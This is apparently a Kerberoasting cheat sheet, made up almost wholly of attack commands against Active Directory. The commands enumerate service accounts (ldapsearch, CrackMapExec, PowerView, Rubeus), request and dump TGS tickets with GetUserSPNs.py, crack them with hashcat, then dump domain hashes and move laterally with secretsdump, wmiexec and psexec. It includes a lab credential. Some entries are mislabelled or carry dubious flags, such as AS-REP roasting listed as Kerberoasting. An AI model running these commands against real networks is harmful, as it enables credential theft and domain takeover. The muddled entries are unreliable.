# Kerberoasting

## Enumeration

```
============ From Linux ============
# LDAP Query
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName memberOf
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" -H ldap://dc-ip "(servicePrincipalName=*)" servicePrincipalName userAccountControl sAMAccountName

# CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
crackmapexec ldap dc-ip -u username -p password -M kerberoast --just-dc
cme ldap dc-ip -u 'domain\user' -p 'pass' --k --sam

# SPN Users Enum and TGS Dump
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile kerberoast_hashes.txt
GetUserSPNs.py -request -dc-ip dc-ip domain/user:password -outputfile spn_hashes.txt

# Secretdumps
secretsdump.py -just-dc domain/admin@dc-ip
grep -i "serviceprincipalname" dump.txt

============ From Windows ============
# SPN Users
Get-DomainUser -SPNTicket -Verbose | Select samaccountname,serviceprincipalname
Get-DomainUser | Where {$_.serviceprincipalname -ne $null} -PipelineVariable User | ForEach-Object {Get-DomainSPNTicket $User.ServicePrincipalName | Select $User.samaccountname}
Get-DomainUser -SPNTicket | ?{$_.EncryptionType -eq 'RC4-HMAC'}

# Service Accounts
Get-NetUser -ServiceAccount
Get-DomainSPN -Identity *<SERVICE_NAME>* | Select serviceprincipalname,distinguishedname

# Rubeus
Rubeus.exe kerberoast /user:targetuser /nowrap
Rubeus.exe kerberoast /outfile:hashes.txt /stats

```

## Attack Vector

```
# TGS Request və Dump
GetUserSPNs.py -request -dc-ip dc-ip 'domain\user:password' -target-user svc-sql -outputfile roast.txt

echo "svc-sql\nsvc-web" > users.txt
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Hash Crack ( Kerberos 5 TGS-REP etype 23 )
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Rubeus
Rubeus.exe kerberoast /user:svc-sql /service:HTTP/web.domain.com /ptt

# CrackMapExec
cme smb dc-ip -u user -p pass -M kerberoast
```

## Post Exploitation

```
secretsdump.py 'domain/svc-sql:crackedpass'@dc-ip -just-dc-user admin

wmiexec.py 'domain/svc-sql:crackedpass'@target-server
psexec.py 'domain/svc-sql:crackedpass'@target-server

